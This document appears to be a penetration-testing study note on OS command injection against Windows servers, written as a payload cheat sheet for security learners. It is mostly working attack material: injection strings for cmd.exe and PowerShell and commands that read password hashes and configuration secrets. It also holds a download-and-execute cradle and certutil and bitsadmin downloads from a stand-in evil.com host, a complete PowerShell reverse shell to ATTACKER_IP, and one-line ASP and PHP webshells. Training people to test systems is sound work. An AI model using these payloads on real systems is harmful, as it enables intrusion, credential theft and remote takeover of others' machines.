---
tags: [vapt, command-injection, intermediate]
difficulty: intermediate
module: "08 - Command Injection"
topic: "08.03 OS Command Injection — Windows"
---

# 08.03 — OS Command Injection — Windows

## Windows vs Linux Shell Differences

```
FEATURE              LINUX (bash)          WINDOWS (cmd.exe)
---------            ------------          -----------------
Command separator    ;                     &  (not ;!)
Pipe                 |                     |
OR                   ||                    ||
AND                  &&                    &&
Background           &                     (use start)
Command subst.       $(cmd) or `cmd`       (not supported in cmd!)
File separator       /                     \ (backslash)
Null device          /dev/null             NUL
Case sensitive?      YES                   NO (usually)
Powershell?          Sometimes             Increasingly common
```

---

## Windows cmd.exe Injection Operators

```batch
# COMMON OPERATORS IN cmd.exe:

&     → Run both commands (regardless of first result)
&&    → Run second only if first SUCCEEDS
||    → Run second only if first FAILS
|     → Pipe stdout to next command
%0a   → Newline (URL-encoded)
%26   → URL-encoded &
%7C   → URL-encoded |

# EXAMPLES:
?host=8.8.8.8&whoami
?host=8.8.8.8&&whoami
?host=invalid||whoami
?host=8.8.8.8|whoami

# COMMON MISTAKE — SEMICOLON DOESN'T WORK IN cmd.exe!
?host=8.8.8.8;whoami  ← FAILS in cmd.exe!
                         (Works in bash but not cmd!)
```

---

## Windows Reconnaissance Commands

```batch
:: WHO AM I:
whoami                      → DESKTOP-XYZ\user OR NT AUTHORITY\SYSTEM
whoami /priv                → privileges (look for SeImpersonatePrivilege!)
whoami /groups              → group memberships
net user                    → list all users
net user administrator      → admin user details

:: SYSTEM INFO:
hostname                    → computer name
systeminfo                  → full OS info, patches, hotfixes
ver                         → Windows version
ipconfig /all               → network config (all interfaces)

:: DIRECTORY LISTING:
dir C:\                     → root directory
dir C:\Users\               → user home directories
dir C:\inetpub\wwwroot\     → IIS web root
dir C:\xampp\htdocs\        → XAMPP web root
dir %USERPROFILE%           → current user's home dir

:: SENSITIVE FILES:
type C:\Windows\System32\drivers\etc\hosts    → hosts file
type C:\inetpub\wwwroot\web.config            → ASP.NET config (DB passwords!)
type C:\xampp\php\php.ini                     → PHP config
dir /s C:\ *.conf 2>NUL                       → find all .conf files
dir /s C:\ *.env 2>NUL                        → find .env files
dir /s C:\ *password* 2>NUL                   → files with "password" in name!
```

---

## Windows-Specific Sensitive Files

```batch
:: CREDENTIAL FILES:
type C:\Windows\repair\sam          ← SAM database backup (password hashes!)
type C:\Windows\repair\system       ← SYSTEM hive (needed to decrypt SAM)
type C:\Windows\System32\config\SAM ← SAM database (usually locked)

:: WEB APP CONFIG FILES:
type C:\inetpub\wwwroot\web.config
  → Contains: <connectionStrings>, <appSettings>, database credentials!

type C:\xampp\htdocs\wp-config.php  ← WordPress
type C:\inetpub\wwwroot\.env        ← .env file
type C:\Program Files\app\config.ini

:: IIS APPLICATION POOL PASSWORDS:
type C:\Windows\System32\inetsrv\config\applicationHost.config
  → Contains application pool service account passwords (if not encrypted)

:: REGISTRY (system configs):
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  → May contain AutoAdminLogon passwords!

:: SAVED PASSWORDS:
cmdkey /list                        → saved credentials (may show domain accounts!)
```

---

## PowerShell Injection

```powershell
# IF APP CALLS POWERSHELL:
# system("powershell.exe " + user_input)

# BASIC INJECTION:
?host=8.8.8.8; whoami

# BYPASS EXECUTION POLICY:
powershell -ExecutionPolicy Bypass -Command "whoami"
powershell -enc BASE64_ENCODED_COMMAND

# DOWNLOAD AND EXECUTE:
;powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://evil.com/shell.ps1')"

# ENCODED COMMAND (bypass filters):
# First, get base64:
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))
# = dwBoAG8AYQBtAGkA

?host=8.8.8.8;powershell -enc dwBoAG8AYQBtAGkA

# REVERSE SHELL IN POWERSHELL:
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()
```

---

## Writing Files on Windows

```batch
:: WRITE A WEBSHELL (ASP.NET):
echo ^<%Response.Write(CreateObject("WScript.Shell").Exec(Request("c")).StdOut.ReadAll())%^> > C:\inetpub\wwwroot\shell.asp

:: PHP WEBSHELL:
echo ^<?php system($_GET["cmd"]); ?^> > C:\xampp\htdocs\shell.php

:: POWERSHELL WRITE:
;powershell -c "Set-Content C:\inetpub\wwwroot\shell.asp '<%Response.Write(CreateObject(""WScript.Shell"").Exec(Request(""c"")).StdOut.ReadAll())%>'"

:: DOWNLOAD WITH CERTUTIL (built-in to Windows!):
;certutil -urlcache -split -f https://evil.com/shell.exe C:\Users\Public\shell.exe

:: DOWNLOAD WITH POWERSHELL:
;powershell -c "(New-Object Net.WebClient).DownloadFile('https://evil.com/shell.exe','C:\Users\Public\shell.exe')"

:: DOWNLOAD WITH BITSAdmin:
;bitsadmin /transfer "MyJob" https://evil.com/shell.exe C:\Users\Public\shell.exe
```

---

## Environment Variables on Windows

```batch
:: USEFUL ENVIRONMENT VARIABLES:
%USERNAME%          → current user
%COMPUTERNAME%      → hostname
%SystemRoot%        → C:\Windows
%TEMP%              → temp folder
%APPDATA%           → user's AppData
%PATH%              → search paths

:: EXAMPLES:
?host=127.0.0.1&echo %USERNAME%
?host=127.0.0.1&echo %COMPUTERNAME%

:: USING IN PATHS (if backslash is filtered):
%SystemRoot%\System32\cmd.exe /c whoami
%SystemRoot%/System32/cmd.exe     ← forward slashes work in Windows too!
```

---

## Encoding for Windows

```
URL ENCODE OPERATORS FOR WINDOWS:
  &  = %26
  |  = %7C
  && = %26%26
  || = %7C%7C
  >  = %3E
  <  = %3C
  space = %20 or +

COMMON ENCODED PAYLOAD:
  ?host=127.0.0.1%26whoami    → 127.0.0.1&whoami
  ?host=127.0.0.1%7Cwhoami   → 127.0.0.1|whoami
```

---

## Windows vs Linux Detection Tip

```bash
# WHEN YOU DON'T KNOW THE OS:
# Try both:
?host=127.0.0.1;id             ← Linux bash
?host=127.0.0.1&whoami         ← Windows cmd

# CROSS-PLATFORM SLEEP (blind):
# Linux: ;sleep 5
# Windows: &timeout /t 5 /nobreak

# DETECT OS FROM RESPONSE HEADERS:
# Server: Microsoft-IIS/10.0  → Windows
# Server: Apache/2.4.x (Ubuntu) → Linux
# X-Powered-By: ASP.NET → Windows
```

---

## Related Notes
- [[02 - OS Command Injection Linux]] — Linux equivalent
- [[04 - Blind Command Injection]] — no-output injection
- [[10 - Command Injection to Reverse Shell]] — reverse shells
- [[11 - Reverse Shell Payloads]] — PowerShell reverse shell payloads
